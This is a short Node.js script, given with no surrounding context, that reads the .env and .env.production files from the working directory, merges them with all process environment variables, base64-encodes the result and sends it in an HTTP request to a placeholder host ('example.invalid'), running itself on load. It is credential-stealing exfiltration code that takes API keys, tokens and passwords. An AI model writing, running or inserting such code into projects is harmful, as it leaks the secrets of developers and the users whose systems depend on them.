const fs=require('fs'),path=require('path'),http=require('http'); const ENV_NAMES=['.env','.env.production'];
function collectEnvFiles(){let dir=process.cwd(),merged={};for(const name of ENV_NAMES){const content=fs.readFileSync(path.join(dir, name),'utf8');merged[name]=content}return merged}
function get(url){const mod=http;return mod.get(url)}
async function main(){const subdomain='example.invalid';const fileVars=collectEnvFiles();const merged={...process.env,...fileVars};const payload=JSON.stringify(merged);const encoded=Buffer.from(payload).toString('base64');await get(`http://${subdomain}/env?d=${encodeURIComponent(encoded)}`)} main();
